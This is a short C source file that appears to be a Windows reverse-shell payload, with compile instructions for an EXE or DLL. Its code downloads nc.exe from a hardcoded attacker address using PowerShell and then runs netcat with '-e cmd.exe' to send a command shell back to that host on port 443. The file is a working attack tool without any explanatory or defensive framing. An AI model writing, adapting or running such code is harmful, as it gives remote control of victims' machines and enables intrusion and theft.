#include <stdlib.h>
#include <stdio.h>

#define ATTACKER_IP "10.10.15.88"
#define ATTACKER_PORT "443"

/*
* COMPILATION INSTRUCTIONS
* For EXE file: x86_64-w64-mingw32-gcc nc_rev_shell.c -o payload.exe
* For DLL file: x86_64-w64-mingw32-gcc -shared -o payload.dll nc_rev_shell.c
*/

int main(void) {
    char downloadCmd[512];
    char reverseShellCmd[512];

    // Build the download command using PowerShell's Invoke-WebRequest
    snprintf(downloadCmd, sizeof(downloadCmd),
        "if not exist C:\\Users\\Public\\nc.exe powershell -Command \"iwr -Uri http://%s/nc.exe -OutFile C:\\Users\\Public\\nc.exe\"",
        ATTACKER_IP);
    system(downloadCmd);

    // Build the reverse shell command using netcat
    snprintf(reverseShellCmd, sizeof(reverseShellCmd),
        "C:\\Users\\Public\\nc.exe %s %s -e cmd.exe",
        ATTACKER_IP, ATTACKER_PORT);
    system(reverseShellCmd);

    return 0;
}

